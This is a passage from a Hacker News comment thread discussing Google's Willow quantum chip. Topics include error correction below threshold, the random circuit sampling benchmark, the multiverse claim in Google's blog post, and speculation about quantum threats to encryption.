benchmarks discussed above: quantum error correction and random circuit sampling. Such algorithmic benchmarks are the best way to measure overall chip performance. Other more specific performance metrics are also important; for example, our T1 times, which measure how long qubits can retain an excitation — the key quantum computational resource — are now approaching 100 µs (microseconds). This is an impressive ~5x improvement over our previous generation of chips. Again, as they lead with, their focus here is on error correction. I'm not sure how their results compare to competitors, but it sounds like they consider that to be the biggest win of the project. The RCS metric is interesting, but RCS has no (known) practical applications (though it is a common benchmark). Their T-times are an improvement over older Google chips, but not industry-leading. I'm curious if EC can mitigate the sub-par decoherence times. [0]: https://www.science.org/doi/abs/10.1126/science.270.5242.163... [1]: https://dl.acm.org/doi/abs/10.5555/3511065.3511068 [2]: https://www.ibm.com/quantum/blog/eagle-quantum-processor-per... reply winwang 1 hour agoparentprevEdit after skimming arxiv preprint[1]: Yeah, this is pretty huge. They achieved the result with surface codes, which are general ECCs. The repetition code was used to further probe quantum ECC floor. \"Just POC\" likely doesn't do it justice. (Original comment): Also quantum dabbler (coincidentally dabbled in bitflip quantum error correction research). Skimmed the post/research blog. I believe the key point is the scaling of error correction via repetition codes, would love someone else's viewpoint. Slightly concerning quote[2]: \"\"\" By running experiments with repetition codes and ignoring other error types, we achieve lower encoded error rates while employing many of the same error correction principles as the surface code. The repetition code acts as an advance scout for checking whether error correction will work all the way down to the near-perfect encoded error rates we’ll ultimately need. \"\"\" I'm getting the feeling that this is more about proof-of-concept, rather than near-practicality, but this is certainly one fantastic POC if true. [1]: https://arxiv.org/abs/2408.13687 [2]: https://research.google/blog/making-quantum-error-correction... Relevant quote from preprint (end of section 1, sorry for copy-paste artifacts): \"\"\" In this work, we realize surface codes operating below threshold on two superconducting processors. Using a 72-qubit processor, we implement a distance-5 surface code operating with an integrated real-time decoder. In addition, using a 105-qubit processor with similar performance, we realize a distance-7 surface code. These processors demonstrate Λ > 2 up to distance-5 and distance7, respectively. Our distance-5 quantum memories are beyond break-even, with distance-7 preserving quantum information for more than twice as long as its best constituent physical qubit. To identify possible logical error f loors, we also implement high-distance repetition codes on the 72-qubit processor, with error rates that are dominated by correlated error events occurring once an hour. These errors, whose origins are not yet understood, set a current error floor of 10−10. Finally, we show that we can maintain below-threshold operation on the 72qubit processor even when decoding in real time, meeting the strict timing requirements imposed by the processor’s fast 1.1µs cycle duration. \"\"\" reply wasabi991011 46 minutes agorootparentYou got the main idea, it's a proof-of-concept: that a class of error-correcting code on real physical quantum chips obey the threshold theorem, as is expected based on theory and simulations. However the main scaling of error correction is via surface codes, not repetition codes. It's an important point as surface codes correct all Pauli errors, not just either bit-flips or phase-flips. They use repetition codes as a diagnostic method in this paper more than anything, it is not the main result. In particular, I interpret the quote you used as: \"We want to scale surface codes even more, and if we were able to do the same scaling with surface codes as we are able to do with repetition codes, then this is the behaviour we would expect.\" Edit: Welp, saw your edit, you came to the same conclusion yourself in the time it took me to write my comment. reply winwang 26 minutes agorootparentHaha, classic race condition, but I appreciate your take nonetheless! reply echelon 1 hour agorootparentprevGoogle could put themselves and everyone else out of business if the algorithms that underpin our ability to do e-commerce and financial transactions can be defeated. Goodbye not just to Bitcoin, but also Visa, Stripe, Amazon shopping, ... reply mperham 53 minutes agorootparentRight? Does TLS1.3 have the underpinnings to use quantum-proof encryption algos? https://en.wikipedia.org/wiki/Post-quantum_cryptography https://www.microsoft.com/en-us/research/project/post-quantu... https://www.forbes.com/councils/forbestechcouncil/2024/10/09... reply bangaladore 45 minutes agorootparentIt seems you can get TLS 1.3 (or atlest slighty modified 1.3) to be quantum secure, but it increases the handshake size by roughly 9x. Cloudflare unfortunately didn't mention much about the other downsides though. https://blog.cloudflare.com/kemtls-post-quantum-tls-without-... reply SAI_Peregrinus 40 minutes agorootparentprevYes-ish. They're not enabled yet, but post-quantum signatures & KEMs are available in some experimental versions of TLS. None are yet standardized, but I'd expect a final version well before QCs can actually break practical signatures or key exchanges. reply bluSCALE4 45 minutes agorootparentprevWhy is no one else talking about this? I came here to see a discussion about this and encryption. reply softwaredoug 1 minute agoprevWith this plus the weather model announcement. I’m curious what people think about the meta question on why corporate labs like Google DeepMind etc seem to make more progress on big problems than academia? There are a lot of critiques about academia. In particular that it’s so grant obsessed you have to stay focused on your next grant all the time. This environment doesnt seem to reward solving big problems but paper production to prove the last grant did something. Yet ostensibly we fund fundamental public research precisely for fundamental changes. The reality seems to be the traditional funding model create incremental progress within existing paradigms. reply codeulike 1 hour agoprevThey opened the API for it and I'm sending requests but the response always comes back 300ms before I send the request, is there a way of handling that with try{} predestined{} blocks? Or do I need to use the Bootstrap Paradox library? reply wk_end 1 hour agoparentFinally, INTERCAL’s COME FROM statement has a practical use. reply handfuloflight 57 minutes agoparentprevHave you tried using the Schrödinger Exception Handler? It catches errors both before and after they occur simultaneously, until you observe the stack trace. reply timcobb 1 hour agoparentprevWhat does Gemini say? reply jawns 1 hour agoprev> It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse I see the evidence, and I see the conclusion, but there's a lot of ellipses between the evidence and the conclusion. Do quantum computing folks really think that we are borrowing capacity from other universes for these calculations? reply wasabi991011 1 hour agoparentI was also really taken aback by this quote. I have no idea who put it there, but I can assure you the actual paper contains no such nonsense. I would have thought whoever writes the google tech blogs is more competent than bottom tier science journalists. But in this case I think it is more reasonable to assume malice, as the post is authored by the Google Quantum AI Lead, and makes more sense as hype-boosting buzzword bullshit than as an honest misunderstanding that was not caught during editing. reply hshshshshsh 46 minutes agorootparentQuantum computation done in done multiple universes is the explanation given by David Deutsch the father of Quantum Computing. He invented the idea of a quantum computer to test the idea of parallel universes. If you are okay with a single universe coming to existence out of nothing you should be able to handle parallel universes as well just fine. Also your comment does not have any useful information. You assumed hype as the reason why they mentioned parallel computing. It's just a bias you have on looking at world. Hype does helps explain a lot of things. So it can be tempting to use it as a placeholder for anything that you don't accept based on your current set of beliefs. reply wasabi991011 30 minutes agorootparentI disagree that it is \"the best explanation we have\". It's a nice theory, but like all theories in quantum foundations / interpretations of quantum mechanics, it is (at least currently) unfalsifiable. I didn't \"assume\" hype, I hypothesized it based on the evidence before me: There is nothing in Google's paper that deals with interpretations of quantum mechanics. This only appears in the blog post, with no evidence given. And there is nothing google is doing with it's quantum chip that would discriminate between interpretations of QM, so it is simply false that \"It lends credence to ... parallel universes\" over another interpretation. reply hshshshshsh 23 minutes agorootparentFrom what I understand, David Deutsch invented the idea of quantum computer as a way to test Parallel Universes. And later people went on and built the quantum computer. Are you saying that the implementation of a quantum computer does not require any kind of assumption on computations being run in parallel universes? reply Vecr 0 minutes agorootparentIt's just not how it works. All this type of quantum computer can do is test some of the more dubious objective collapse theories. Those are wrong anyway, so all theories that are still in the running agree. killerstorm 7 minutes agoparentprevEverett interpretation simply asserts that quantum wavefunctions are real and there's no such thing as \"wavefunction collapse\". It's the simplest interpretation. People call it \"many worlds\" because we can interact only with a tiny fraction of the wavefunction at a time, i.e. other \"branches\" which are practically out of reach might be considered \"parallel universes\". But it would be more correct to say that it's just one universe which is much more complex than what it looks like to our eyes. Quantum computers are able to tap into this complexity. They make a more complete use of the universe we are in. reply gaze 1 hour agoparentprevI'm upset they put this in because this is absolutely not the view of most quantum foundations researchers. reply klipt 1 hour agorootparentSoon: \"are alien universes slowing down your internet? Click here to learn more!\" Reminds me of the Aorist Rods from Hitchhikers' Guide to the Galaxy. reply rafram 1 hour agorootparentWell there has to be some reason I'm not getting the \"gigabit\" speeds I was quoted. reply ColinHayhurst 1 hour agorootparentprevCredibility of the article plummeted when I got to that sentence, and especially since using name dropping. reply hshshshshsh 45 minutes agorootparentprevScience is not based on consensus seeking. Science is about coming up with the best explanations irrespective of whether or not a large chunk does not believe it. And best explanations are the ones that is hard to vary. Not the one that is most widely accepted or easy to accept based on the current world view. reply brisky 18 minutes agorootparentDavid is this you? reply jayd16 32 minutes agorootparentprevActually it is exactly based on hypotheses that are verified. reply hshshshshsh 27 minutes agorootparentAnd how do you verify hypothesis? What is the process to do that? reply ferfumarma 56 minutes agorootparentprevOne of the biggest problems with such an assertion is that it's not falsifiable. It could be that we are borrowing qbit processing power from Russel's quantum teapot. reply whimsicalism 1 hour agorootparentprevthe everettian view is absolutely not the view? i am not so sure. or you mean specifically the parallel computation view? reply wasabi991011 1 hour agorootparentIn my opinion the \"shut up and calculate\" view is the most common among actual quantum computing researchers. Unsure about those working on quantum foundations, but I think the absence of consensus is enough to claim any view as absolutely not the view. reply whimsicalism 1 hour agorootparenti don’t really view “shut up and calculate” or very restrained copenhagenism as a real view at all. i think if you were to ask people to make a real metaphysical speculation, majority might be partial to everett - especially if they felt confident the results were anonymous reply wasabi991011 12 minutes agorootparentI agree, but that kind of goes to my point: I believe the vast majority of researchers in quantum computing* spend almost no time on metaphysical speculation, *Well, those on the \"practical side\" that thinks about algorithms and engineering quantum systems like the Google Quantum AI team and others. Not the computer science theorists knee-deep in quantum computational complexity proofs nor physics theorists working on foundations of quantum mechanics. But these last two categories are outnumbered by the \"practical\" side. reply gaze 1 hour agorootparentprevsorry -- the results don't add weight to one view or the other. The interpretations are equivalent. reply whimsicalism 1 hour agorootparentnot metaphysically equivalent. also, i’m not so certain it will always be untestable. i would have thought the same thing about hidden variables but i underestimated the cleverness of experimentalists reply DennisP 58 minutes agorootparentI think \"experimentally equivalent\" is what GP meant, and as of today, it holds true. Google's results are predicted by other interpretations just as well as by Everett. Maybe someday there will be a clever experiment to distinguish the models but just \"we have a good QC\" is not that. reply whimsicalism 14 minutes agorootparenti think you're arguing against a point i never made in any of my comments reply aithrowawaycomm 1 hour agoparentprevIn the same way people believe P != NP, most quantum computing people believe BQP != NP, and NP-complete problems will still take exponential time on quantum computers. But if we had access to arbitrary parallel universes then presumably that shouldn't be an issue. The success on the random (quantum) circuit problem is really a valdiation of Feynman's idea, not Deutsch: classical computers need 2^n bits to simulate n qubits, so we will need quantum computers to efficiently simulate quantum phenomena. reply paxys 1 hour agoparentprevI don't understand the jump from: classical algorithm takes time A -> quantum algorithm takes time B -> (A - B) must be borrowed from a parallel universe. Maybe A wasn't the most efficient algorithm for this universe to begin with? reply GenerWork 57 minutes agoparentprev>Do quantum computing folks really think that we are borrowing capacity from other universes for these calculations? Doesn't this also mean that other universes have civilizations that could potentially borrow capacity from our universe, and if so, what would that look like? reply aithrowawaycomm 1 hour agoparentprevI suspect the real issue is that Big Tech investors and executives (including Sundar Pichai) are utterly hopped up on sci-fi, and this sort of stuff convinces them to dedicate resources to quantum computing. reply kridsdale1 58 minutes agorootparentThat explains metaverse funding at least. reply johnfn 1 hour agoparentprevYou don't even have to get to the point where you're reading a post off Scott Aaronson's blog[1] at all; his headline says \"If you take nothing else from this blog: quantum computers won't solve hard problems instantly by just trying all solutions in parallel.\" [1]: https://scottaaronson.blog/ reply korkybuchek 1 hour agoparentprev> Do quantum computing folks really think that we are borrowing capacity from other universes for these calculations? Tangentially related, but there's a great Asimov book about this called The Gods Themselves (fiction). reply vessenes 1 hour agorootparentI’m partial to Anathem by Stephenson on this topic as well reply korkybuchek 35 minutes agorootparentThanks for the recommendation! reply rdtsc 1 hour agoparentprev> It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse, a prediction first made by David Deutsch. That's in line with a religious belief. One camp believes one thing, other believes something else, others refuse to participate and say \"shut up and calculate\". Nothing wrong with religious beliefs of course, it's just important to know that is what it is. reply ko27 1 hour agoparentprevIt's a perfectly legit interpretation of what's happening, and many physicists share the same opinion. Of course the big caveat is that you need to interfere those worlds so that they cancel out, which necessarily requires a lower algorithmic bound which prevents you from doing infinite amount of computation in an instant. reply ComputerGuru 1 hour agoparentprevIt doesn’t make sense to me because if we can borrow capacity to perform calculations then we can “borrow” an infinite amount of energy. reply griomnib 1 hour agorootparentClimate change solved: steal energy from adjacent universes, pipe our carbon waste into theirs. reply danielbln 1 hour agorootparentRemind me of The Expanse, where the ring space is syphoning energy from some other universe to keep the gates open. reply kridsdale1 57 minutes agorootparentprevIt’s “out of the environment”. reply hshshshshsh 30 minutes agoparentprevThe quantum computer idea was literally invented by David Deutsche to test the many universes theory of quantum physics. reply wasabi991011 19 minutes agorootparentYou've mentioned this in another comment. I have to point out, even if this is his opinion, and he has been influential in the field, it does not mean that this specific idea of his has been influential. reply hshshshshsh 18 minutes agorootparentSorry. I don't care whether an idea was influential or not. All I care is whether someone has a better explanation. reply wasabi991011 10 minutes agorootparentI'll remind you of the quote that started this thread: \"Do quantum computing folks really think that we are borrowing capacity from other universes for these calculations?\" In this context, your opinion and Deutsch's opinion don't matter. The question is about whether the idea is common in the field or not. reply hshshshshsh 1 minute agorootparentOkay. I just don't understand. Are you saying Quantum Computers are also implemented without assuming the computations run in parallel universe? melvinmelih 1 hour agoparentprev> It performed a computation in under five minutes that would take one of today’s fastest supercomputers 1025 or 10 septillion years. If you want to write it out, it’s 10,000,000,000,000,000,000,000,000 years. If it's not, what would be your explanation for this significant improvement then? reply shawabawa3 26 minutes agorootparentQuantum computing can perform certain calculations much faster than classical computing in the same way classical computing can perform certain calculations much faster than an abacus reply Ar-Curunir 57 minutes agorootparentprevI mean, that's like saying GPUs operate in parallel universes because they can do certain things thousands of times faster than CPUs. reply readyplayernull 1 hour agoprev> It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse, a prediction first made by David Deutsch. Processing in multiverse. Would that mean we are inyecting entropy into those other verses? Could we calculate how many are there from the time it takes to do a given calculation? We need to cool the quantum chip in our universe, how are the (n-1)verses cooling on their end? reply jsvlrtmred 1 hour agoparentAFAIK a fundamental step in any quantum computing algorithm is bringing the qubits back to a state with a nonrandom outcome (specifically, the answer to the problem being solved). Thus a \"good\" quantum computer does not bifurcate the wavefunction at a macro level, ie there is no splitting of the \"multiverse\" after the calculation. reply deanCommie 1 hour agoparentprevWhat if we are? And by injecting entropy into it, we are actually hurrying (in small insignificant ways) the heat death of those universes? What if we keep going and scale out and in the future it causes a meaningful impact to that universe in a way that it's residents would be extremely unhappy with, and would want to take revenge? What if it's already happening to our universe? And that is what black holes are? Or other cosmology concepts we don't understand? Maybe a great filter is your inability to protect your universe from quantum technology from elsewhere in the multiverse ripping yours up? Maybe the future of sentience isn't fighting for resources on a finite planet, or consuming the energy of stars, but fighting against other multiverses. Maybe The Dark Forest Defence is a decision to isolate your universe from the multiverse - destroying it's ability to participate in quantum computation, but also extending it's lifespan. (I don't believe ANY of this, but I'm just noting the fascinating science fiction storylines available) reply kridsdale1 54 minutes agorootparentI’d say it’s more akin to Dark Energy than anything Black Hole related. DE is some sort of entropy that is being added to our cosmos in an exponential way over historic time. It began at a point a few billion in to our history. reply navaati 1 hour agorootparentprevGetting strong vibes of Asimov’s novel \"The Gods Themselves\" here ! For those who haven’t read it I recommend it. It’s a nice little self-contained book, not a grandiose series and universe, but I love it. reply thrance 1 hour agoparentprevThe many-worlds interpretation of quantum theory [1] is widely considered unfalsifiable and therefore mostly pseudoscientific. This article is way in over it's head in claiming such nonsense. [1] https://en.wikipedia.org/wiki/Many-worlds_interpretation reply DebtDeflation 1 hour agoprev>the more qubits we use in Willow, the more we reduce errors, and the more quantum the system becomes That's an EXTRAORDINARY claim and one that contradicts the experience of pretty much all other research and development in quantum error correction over the course of the history of quantum computing. reply wasabi991011 1 hour agoparentIt's really not so extraordinary, exponential reduction in logical errors when the physical error rate is below a threshold (for certain types of error correcting codes_ is well accepted an both theoretical and computational grounds. For a rough but well-sourced overview, see Wikipedia: https://en.wikipedia.org/wiki/Threshold_theorem For a review paper on surface codes, see A. G. Fowler, M. Mariantoni, J. M. Martinis, and A. N. Cleland, “Surface codes: Towards practical large-scale quantum computation,” Phys. Rev. A, vol. 86, no. 3, p. 032324, Sep. 2012, doi: 10.1103/PhysRevA.86.032324. reply DebtDeflation 1 hour agorootparentDoes this not assume uncorrelated errors? reply wasabi991011 5 minutes agorootparentIt does. It's up to engineering to make errors uncorrelated. The google paper being referenced actually makes an \"error budget\" to see what the main sources of errors are, and also run tests to find sources of correlated errors. The claim about this is that correlated errors will lead to an \"error floor\", a certain size of error correction past which exponential reduction in errors no longer applies, due to a certain frequency of correlated errors. See figure 3a of the arxiv version of the paper: https://arxiv.org/abs/2408.13687 reply pandemic_region 1 hour agoprev> Willow performed a standard benchmark computation in under five minutes that would take one of today’s fastest supercomputers 10 septillion years — a number that vastly exceeds the age of the Universe. What computation would that be? Also, what is the relationship, if any, between quantum computing and AI? Are these technologies complementary? reply ra7 1 hour agoparentIt's in the article. Random circuit sampling benchmark: https://research.google/blog/validating-random-circuit-sampl... reply crote 40 minutes agorootparentIs it really fair to call that \"computation\"? I am definitely not an expert, but it seems they are just doing a meaningless operation which happens to be trivial on a quantum computer but near-impossible to simulate on a classical computer. To me that sounds a bit like saying my \"sand computer\" (hourglass) is way faster than a classical computer, because it'd take a classical computer trillions of years to exactly simulate the final position of every individual grain of sand. Sure, it proves that your quantum computer is actually a genuine quantum computer, but it's not going to be topping the LINPACK charts or factoring large semiprimes any time soon, is it? reply wasabi991011 1 hour agoparentprev> Also, what is the relationship, if any, between quantum computing and AI? Are these technologies complementary? Ongoing research. The main idea of quantum machine learning is that qubits make an exponentially high-dimensional space with linear resources, so can store and compute a lot of data easily. However, getting the data in and results out of the quantum computer is tricky, and if you need many iterations in your optimization, that may destroy any advantage you have from using quantum computers. reply 0xB31B1B 1 hour agoparentprev\"Also, what is the relationship, if any, between quantum computing and AI? Are these technologies complementary?\" AI is limited in part by the computation available at training and runtime. If your computer is 10^X times faster, then your model is also \"better\". Thats why we have giant warehouses full of H100 chips pulling down a few megawatts from the grid right now. Quantum computing could theoretically allow your phone to do that. reply spencerflem 57 minutes agorootparentA quantum computer is not just a 10^X faster normal computer. Are there AI algorithms that would benefit from quantum? reply kridsdale1 56 minutes agorootparentprevMakes sense. My brain is able to do that work on milliwatts. reply fidotron 1 hour agoprevThe slightly mind blowing bit is detailed here: > https://research.google/blog/making-quantum-error-correction... “the first quantum processor where error-corrected qubits get exponentially better as they get bigger” Achieving this turns the normal problem of scaling quantum computation upside down. reply thrance 1 hour agoparentIt also breaks a fundamental law of quantum theory, that the bigger a system in a quantum state is, the faster it collapses, exponentially so. Which should at least tell you to take Google's announcement with z grain of salt. reply wasabi991011 2 minutes agorootparentThis is not a \"fundamental law of quantum theory\", as evidenced by the field of quantum error correcting codes. Google's announcement is legit, and is in line with what theory and simulations expect. reply radioactivist 31 minutes agoprevSome of these results have been on the arxiv for a few months (https://arxiv.org/abs/2408.13687) -- are there any details on new stuff besides this blog post? I can't find anything on the random circuit sampling in the preprint (its early access published version). reply TachyonicBytes 42 minutes agoprevLink to the actual article: https://www.nature.com/articles/s41586-024-08449-y reply zelon88 36 minutes agoprev> It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse, a prediction first made by David Deutsch. Can someone explain to me how he made the jump from \"we achieved a meaninful threshold in quantum computing performance\" to \"The multiverse is probably real.\" reply fguerraz 57 minutes agoprevAm I oversimplifying in thinking that they’ve demonstrated that their quantum computer is better than at simulating a quantum system than a classical computer? In which case, should I be impressed? I mean sure, it sounds like you’ve implemented a quantum VM. reply vhiremath4 1 hour agoprevI really wish the release videos made things a ~tad~ bit less technical. I know quantum computers are still very early so the target audience is technical for this kind of release, but I can’t help wonder how many more people would be excited and pulled in if they made the main release video more approachable. reply ipsum2 1 hour agoprevThey renamed quantum supremacy to \"beyond-classical\"? That's something. reply sdenton4 1 hour agoparentQuantum supremacy was an absolutely awful name for what it was (ability to do something, anything, better than a classical computer, which remains 'supreme' on all problems of any practical interest). reply maxboone 1 hour agoparentprevhttps://arxiv.org/abs/1705.06768 It's not something that new, I like it. reply rdtsc 1 hour agoprevThe main part for me is reducing error faster as they scale. This was a major road-block, known as \"below threshold”. That's a major achievement. I am not sure about RCS as the benchmark as not sure how useful that is in practice. It just produced really nice numbers. If I had a few billions of pocket change around, would I buy this to run RCS really fast? -Nah, probably not. I'll get more excited when they factor numbers at a rate that would break public key crypto. For that would spend my pocket change! reply vessenes 1 hour agoparentThe implication seems to be that they can implement other gates. As my gen z kids say: huge if true. reply wasabi991011 1 hour agorootparentIt's really important to note that the error correction test and the random circuit test are separate tests. The error correction is producing a single logical qubit of quantum memory, i.e. a single qubit with no gates applied to it. Meanwhile, the random circuit sampling uses physical qubits with no error correction, and is used as a good benchmark in part because it can prove \"quantumness\" even in the presence of noise.[1] [1] https://research.google/blog/validating-random-circuit-sampl... reply xnx 1 hour agoprevIs anyone else even close to Google in this space? (e.g. on the \"System Metrics\" the blog defines) reply ryandvm 17 minutes agoprevImagine your civilization develops quantum computing technology and it's for... advertising. \"What is their mission? Cure cancer? Eliminate poverty? Explore the universe? No, their goal: to sell another fucking Nissan.\" --Scott Galloway reply mperham 15 minutes agoparentThat's how you monetize attention, digital consumption. If you aren't paying for it, you are the product being sold. reply gordon_freeman 1 hour agoprevSo one of the interesting comparisons between Quantum computing vs classical in the video: 5 mins vs 10^25 years. So are there any tradeoffs or specific cases in which the use cases for Quantum computing works or is this generic for \"all\" computing use cases? if later then this will change everything and would change the world. reply antognini 1 hour agoparentThere are only certain kinds of computing tasks which are amenable to an exponential speedup from quantum computing. For many classical algorithms the best you get from a quantum computer is an improvement by a factor of sqrt(N) by using Grover's algorithm. The other tradeoff is that quantum computers are much noisier than classical computers. The error rate of classical computers is exceedingly low, to the extent that most programmers can go their entire career without even considering it as a possibility. But you can see from the figures in this post that even in a state of the art chip, the error rates are of order ~0.03--0.3%. Hopefully this will go down over time, but it's going to be a non-negligible aspect of quantum computing for the foreseeable future. reply pitpatagain 1 hour agoparentprevIt is specific to cases where a quantum algorithm exists that provides speedup, it is not at all generic. The complexity class of interest is BQP: https://en.wikipedia.org/wiki/BQP Also of note: P is in BQP, but it is not proven that BQP != P. Some problems like factoring have a known polynomial time algorithm, and the best known classical algorithm is exponential, which is where you see these massive speedups. But we don't know that there isn't an unknown polynomial time classical factoring algorithm and we just haven't discovered it yet. It is a (widely believed) conjecture, that there are hard problems solved in BQP that are outside P. reply dabeeeenster 1 hour agoparentprevIts for a very, very, very narrow set of algorithms AFAIUI. reply htrp 1 hour agoprev105 qubits reply sys32768 1 hour agoprevIn other words, get off the cloud so nobody has your encrypted data which they will be able to crack in a few minutes five or ten years from now? reply kernal 1 hour agoprev>Willow’s performance on this benchmark is astonishing: It performed a computation in under five minutes that would take one of today’s fastest supercomputers 1025 or 10 septillion years. If you want to write it out, it’s 10,000,000,000,000,000,000,000,000 years. This mind-boggling number exceeds known timescales in physics and vastly exceeds the age of the universe. It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse, a prediction first made by David Deutsch. A much simpler explanation is that your benchmark is severely flawed. reply wasabi991011 56 minutes agoparent\"Severely flawed\" is a matter of interpretation, and I don't want to argue for or against. But to put into context, these numbers are likely accurate, but represent the time it would take for a very naive classical algorithm (possibly brute-force, I am unsure). For example, the previous result claimed it would take Summit 10,000 years to do the same calculation as the Sycamore quantum chip. However, other researchers were able to reproduce results classically using tensor-network-based methods in 14.5 days using a \"relatively small cluster\". [1] [1] G. Kalachev, P. Panteleev, P. Zhou, and M.-H. Yung, “Classical sampling of random quantum circuits with bounded fidelity,” arXiv.org, https://arxiv.org/abs/2112.15083 (accessed Dec. 9, 2024). reply wslh 1 hour agoprevELI5: what I could do if I have this chip at home? reply wrsh07 1 hour agoparentProbably just research on quantum computers? I don't think it's big enough to let you solve any practical problems, but maybe someone can correct me reply d3m0t3p 1 hour agorootparentIF (and that's a big if) that's true then it means they can factorize number into primes with this quantum computer and break encryption. reply wasabi991011 53 minutes agorootparentNo, that's not what that means. Not sure what you mean by the \"that\" when you say \"if that's true\", but there is nothing in this thread or by google that is anywhere close to breaking encryption. reply bluSCALE4 43 minutes agorootparentHow are you so sure? If something that takes years is completed in minutes, how is encryption safe? reply shawabawa3 10 minutes agorootparentThe amount of cubits required for a practical application of shors algorithm to break modern encryption is known and it's around 2500 qubits Willow has 100 reply Ar-Curunir 54 minutes agorootparentprevNo, this quantum computer cannot factorize the large composite numbers that we use for modern RSA. Even for the numbers that it can factor, I don't think it will be faster than a decent classical computer. reply tombert 1 hour agoprevInteresting; it might be time for me to load up a quantum simulator and star learning how to program these things. I've pushed that off for a long time since I wasn't completely convinced that quantum computers actually worked, but I think I was wrong. reply nick__m 38 minutes agoparentIBM has well structured learning material and a quantum simulator at https://learning.quantum.ibm.com/ Also my almamater made the quantum enigmas series that is appropriate for high-school students (it also interesting if you have no prior knowledge about quantum computing) https://www.usherbrooke.ca/iq/quantumenigmas/ (it also use IBM online learning platform) reply nuz 1 hour agoprevEvery time this comes up people say they're not actually useful for ML. Is that true? And if not what would they be useful for reply LampCharger 1 hour agoparentNo, a true quantum computer will not necessarily solve NP-complete (NPC) problems efficiently. Quantum algorithms like Grover’s provide quadratic speedups, but this is insufficient to turn exponential-time solutions into polynomial-time ones. While quantum computers excel in specific tasks (e.g., Shor’s algorithm for factoring), there’s no evidence they can solve all NP-complete problems efficiently. Current complexity theory suggests that , the class of problems solvable by quantum computers, does not encompass . Quantum computers may aid in approximations or heuristics for NPC problems but won’t fundamentally resolve them in polynomial time unless , which remains unlikely. reply vessenes 1 hour agoparentprevFactoring. Reversing ECC operations. Decrypting all the data thought to be safely stored at rest in any non quantum resistant storage. I do think ai algorithms could be built that quantum gates could be fast at, but I don’t have any ideas off the top of my head this morning. If you think of AI training as searching the space of computational complexity and quantum algorithms as accessing a superposition of search states I would guess there’s an intersection. Google thinks so too - the lab is called quantum ai. reply whimsicalism 1 hour agoparentprevbreaking crypto, for one reply christkv 1 hour agoparentprevIn principal NP complete problems is my guess. reply wazdra 1 hour agorootparentIt is unknown whether quantum computing makes NP-complete problems easier to solve. There is a complexity class for problems that can be solved \"efficiently\" on using quantum computing, called BQP. How BQP and NP are related is unknown. In particular, if an NP-complete problem was shown to be solvable efficiently with Quantum Computing (and thus in BQP), this open (and hard) research question would be solved (or at least half of it). Note that BQP is not \"efficient\" in a real-word fashion, but for theoretical study of Quantum computing, it's a good first guess reply benbayard 42 minutes agorootparentprevAFAIK, which is not much, I believe it is problems that you can turn in to a cycle. Right now we pull out answers from quantum computers at random, but typically do not know what the inputs were that got that answer. But if you can get the answers from the quantum computer to be cyclical you can use that symmetry to get all the information you need. reply whimsicalism 1 hour agoprevWe need to seriously think if our systems/society are even remotely ready for this. reply _benj 1 hour agoparentThis comment reminded me of the TV show I've been recently watching on Netflix, Pantheon. It's about a different technical breakthrough (I don't want to put any spoilers), but it's also something that completely alters society, no security is able to deal with that new technology, first thing that happens is that the technology is weaponized... etc. Idk enough about quantum computing to even understand this... but a technology that turns, say, AES or Blowfish, suddenly trivial to crack would very likely change the world reply kridsdale1 53 minutes agorootparentThis is how I feel about drones. reply riiii 41 minutes agorootparentThey'll be banned for public use in the next 2-3 years. I'm not advocating for the ban, just saying it'll happen. reply germandiago 1 hour agoparentprevIn order to evolve, forbiding evolution is the wrong path. Just use and study and learn from new things and accumulate experience is the way to go. reply kridsdale1 53 minutes agorootparentBiological evolution occurs on the backs of millions of deaths. reply seanw444 1 hour agoparentprevThey're not. What's there to think about? reply preisschild 57 minutes agoparentprevAs if \"thinking about it\" will ever stop people from acting first. I'm far more scared when tech-bros like Musk land on Mars and contaminate stuff we might not even be able to detect yet. reply whimsicalism 15 minutes agorootparenti'm not even remotely 'far more scared' about that. i think you are insufficiently scared about crypto being broken reply taf2 1 hour agoprevIs this using ionq or is this in-house from google? reply vessenes 1 hour agoparentThey say in-house with their own US fab in the announcement. reply Mistletoe 1 hour agoprevIn what ways could Google monetize quantum computing? reply michaelt 1 hour agoparentSearching through an unstructured data set of size N on a classical computer takes O(N) time but on a quantum computer, Grover's Algorithm allows such a search to be performed in O(N^0.5) time. So Quantum Computing, could bring us a future where, when you perform a Google search for a word, the web pages returned actually contain the word you searched for. reply _benj 1 hour agorootparent> So Quantum Computing, could bring us a future where, when you perform a Google search for a word, the web pages returned actually contain the word you searched for. Lol! I'm not gonna put a kagi plug here... reply 7e 1 hour agoprevQuantum mechanics is a computational shortcut that makes our simulation cost-effective. Mass adoption of chips like these is going to make the particular situation we live in unprofitable for hosts, resulting in the firey and dramatic end of the world for us. Simulating ancestors is fun, but not after your cloud bill skyrockets. Thank you, Google, for bringing about the apocalypse. reply deanCommie 1 hour agoprevI don't want to judge people by their cover, but I want to confess to having those feelings right now. In this day and age, I feel an immediate sense of distrust to any technologist with the \"Burning Man\" aesthetic for lack of a better word. (which you can see in the author's wikipedia profile from an adjacent festival -> https://en.wikipedia.org/wiki/Hartmut_Neven, as well as in this blog itself with his wristbands and sunglasses -> https://youtu.be/l_KrC1mzd0g?si=HQdB3NSsLBPTSv-B&t=39) In the 2000's, any embracement of alternative culture was a breath of fresh air for technologists - it showed they cared about the human element of society as much as the mathematics. But nowadays, especially in a post-truthiness, post-COVID world, it comes off in a different way to me. Our world is now filled with quasi-scientific cults. From flat earthers to anti-vaxxers, to people focused on \"healing crystals\", to the resurgence of astrology. I wouldn't be saying this about anyone in a more shall we say \"classical\" domain. As a technologist, your claims are pretty easily verifiable and testable, even on fuzzy areas like large language models. But in the Quantum world? I immediately start to approach the author of this with distrust: * He's writing about multiverses * He's claiming a quantum performance for something that would take a classical computer septillions of years. I'm a layman in this domain. If these were true, should they be front page news on CNN and the BBC? Or is this just how technology breakthroughs start (after all the Transformer paper wasn't) But no matter what I just can't help but feel like the author's choices harm the credibility of the work. Before you downvote me, consider replying instead. I'm not defending feeling this way. I'm just explaining what I feel and why. reply bubblyworld 59 minutes agoparentI don't share your mistrust of the aesthetic, but I think it's pretty natural to be skeptical of the out-group, so to speak, doubly so if you have no practical way of verifying their claims. At least you're honest about it! I guess something to think about it that amongst a group like the \"burners\" there is huge variety in individual experience and skill. And even within a 